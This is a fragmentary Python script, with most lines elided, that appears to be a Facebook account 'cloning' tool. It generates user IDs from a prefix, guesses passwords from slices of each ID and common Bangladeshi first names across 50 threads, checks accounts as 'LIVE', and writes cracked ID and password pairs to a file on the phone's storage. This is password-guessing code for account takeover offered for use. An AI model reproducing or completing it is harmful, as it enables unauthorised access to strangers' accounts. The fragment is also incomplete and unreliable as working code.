...
def BD_CLONING():
    ...
    with tred(max_workers=50) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','sumaiya','ayesha','shakil','saiful']
...
def lock_check(uid):
    ...
    if tx =='Facebook':
        ...
        return('LIVE')
                ...
                print('\r\r \033[1;30m[SBsb-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/SBsb-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
